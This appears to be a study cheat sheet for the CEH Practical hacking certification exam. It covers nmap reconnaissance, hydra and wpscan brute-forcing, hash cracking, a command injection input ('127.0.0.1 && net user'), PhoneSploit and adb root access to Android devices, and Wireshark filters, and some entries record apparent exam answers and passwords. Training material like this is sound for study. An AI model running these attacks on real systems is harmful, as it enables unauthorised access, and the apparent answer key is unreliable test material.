# CEH Practical Reference Guide

## Enumeration & Reconnaissance

### Identify Live Hosts
```bash
nmap -sn 192.168.0.0/24
```

### Detect Open Ports
```bash
nmap -p- 192.168.0.X
```

### Find a Domain Controller
```bash
nmap -p 389,636,88,3268 192.168.0.0/24
```

### Get NetBIOS Name and FQDN
```bash
nmap -sC 192.168.0.X --top-ports=20
```

### Find OpenSSH Version
```bash
nmap -p 22 192.168.0.0/24 --open -T5 -sV
```

### Detect Operating System

**Step 1**
```bash
nmap -p 3306 192.168.0.X --open
```

**Step 2**
```bash
nmap -O 192.168.0.X -sV -T5
```

### LDAP Enumeration

#### User Count
```bash
nmap 192.168.0.X --script=*user*
```

#### LDAP Version
```bash
ldapsearch -x -H ldap://192.168.0.X
```

---

## Service Discovery

### Check NFS
```bash
nmap -p 111 192.168.0.0/24 --open
```

### DNS Enumeration
```bash
nslookup -type=ns www.certifiedhacker.com
```

### Find SMTP Servers
```bash
nmap -p 25 192.168.0.0/24 --open -T5
```

### SMB Enumeration (Message Signing)
```bash
nmap -p 445 192.168.0.X -sC -T5
```

---

## Password Attacks

### Crack NTLM Hashes
```bash
john hashes.txt --format=NT --wordlist=password.txt
```

### Brute Force FTP
```bash
hydra -L Username.txt -P Passwords.txt 172.16.0.12 ftp
```

### Access FTP
```bash
ftp 172.16.0.12

ftp> ls
ftp> mget *

cat flag.txt
```

### GUI Password Auditing
- L0phtCrack

---

## File & Hash Extraction

### DVWA File Upload Challenge

Access:
```text
http://10.10.10.25:8080/DVWA
```

Read uploaded file:
```cmd
type C:\wamp64\www\DVWA\hackable\uploads\Hash.txt
```

### Online Hash Cracking

- https://hashes.com/en/decrypt/hash
- https://crackstation.net

---

## Steganography & Binary Analysis

### Snow
```cmd
snow.exe -C "C:\path\to\file.txt"
```

### Image Steganography
- OpenStego

### Analyze Windows Executables
- BinText

### Analyze ELF Binaries
```bash
file Sample-ELF
```

Alternative:
- Ghidra

---

## Wireshark Challenges

### HTTP POST Requests
```text
http.request.method == POST
```

### UDP Data Inspection
```text
udp
```

### ICMP Traffic
```text
icmp
```

### DoS Source Identification
```
Statistics → Conversations
```

### DDoS Source Count
```
Statistics → Conversations → IPv4
```

### Session Hijacking Detection
```text
arp
```

### UDP Payload Length
```text
udp
```

---

## Web & CMS Enumeration

### Detect Nginx Version
```bash
whatweb www.example.com
```

### Identify CMS Technology
Tools:
- WhatWeb
- WIG
- Wappalyzer

### Find PNG Files
```bash
curl http://example.com/ | grep .png | wc -l
```

### Detect Load Balancer
```bash
lbd example.com
```

Alternative:
```bash
whatweb example.com
```

### Parameter Tampering

```text
movies.cehorg.com/viewprofile.aspx?id=1003
```

Expected result:
```text
linda
```

### WordPress Login Audit

```bash
wpscan --url http://cehorg.com/ -U adam -P /path/password.txt
```

Possible result:
```text
Orange1234
```

---

## Command Injection

Example:
```text
127.0.0.1 && net user
```

Used to enumerate local users.

---

## Mobile Exploitation

### Capture Screenshot with PhoneSploit

```bash
phonesploit.py
```

Connect:
```text
172.16.0.21
```

Retrieve:
```text
sdcard/DCIM/capture.png
```

### Read Android Files

```bash
adb shell
su root

cd sdcard/Download

cat confidential.txt
```

### APK Analysis

Target:
```text
AntiMalwarescanner.apk
```

Tool:
- https://sisik.eu/apk-tool

---

## IoT & MQTT Analysis

### MQTT Traffic Analysis

Wireshark filter:

```text
mqtt
```

Review packets around:

```text
49
201
```

Topics:

```text
Fleet_Count
Data Bre@ch @lert
```

---

## Encryption Challenges

### AES Decryption

Tool:
```text
AES Tool
```

Password:
```text
qwerty
```

### VeraCrypt

Password:
```text
test
```

Count the files after mounting.

### Hidden IP Recovery

Tool:
```text
BCTextEncoder
```

Password:
```text
Pa$$w0rd
```

Sample Result:
```text
10.10.10.31
```

### CrypTool Challenge

File:
```text
cryt-128-06encr.hex
```

Algorithm:
```text
Twofish
```

Recovered Text:
```text
@!ph@|tE*t
```

---

## Footprinting & OSINT

### IP Geolocation

https://www.ipvoid.com/ip-geolocation/

Use to obtain:
- Latitude
- Longitude
- Location

### Shodan

https://shodan.io

Use to identify:
- SCADA systems
- ICS devices
- IoT devices
- Open services

---

## Additional Commands

### Windows Service Type

```powershell
(Get-Service -Name "afunix").ServiceType
```

### DHCP Starvation Traffic

```bash
sudo tcpdump -i eth0 -v
```

### HTTP Recon via Telnet

```bash
telnet example.com 80
```

Then:

```http
GET / HTTP/1.0
```

---

# Quick Reference

| Objective | Tool/Command |
|------------|-------------|
| Live Hosts | `nmap -sn` |
| Open Ports | `nmap -p-` |
| LDAP Version | `ldapsearch` |
| SMB Enumeration | `nmap -p 445 -sC` |
| SMTP Discovery | `nmap -p 25` |
| FTP Brute Force | `hydra` |
| Hash Cracking | `john` |
| CMS Detection | `whatweb` |
| WordPress Testing | `wpscan` |
| MQTT Analysis | Wireshark (`mqtt`) |
| APK Analysis | APK Tool |
| Binary Analysis | BinText / Ghidra |
| Geolocation | IPVoid |
| Internet Exposure Search | Shodan |
